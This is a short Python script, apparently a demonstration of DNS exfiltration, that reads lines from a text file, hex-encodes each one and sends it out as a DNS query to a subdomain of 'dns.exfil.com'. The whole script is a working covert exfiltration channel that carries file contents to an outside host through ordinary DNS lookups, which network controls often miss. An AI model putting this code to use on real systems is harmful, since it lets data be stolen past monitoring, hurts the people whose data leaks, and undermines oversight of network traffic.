import dns.resolver
import urllib.request, urllib.parse, urllib.error

myResolver = dns.resolver.Resolver()
domain = "dns.exfil.com"

with open('lyrics.txt') as f:
    content = f.readlines()
    content = [x.strip() for x in content] 

for line in content:
    hex = ''.join("{:02x}".format(ord(c)) for c in line)
    #print hex
    #print len(hex)

    query = myResolver.query(hex + "." + domain, "A")
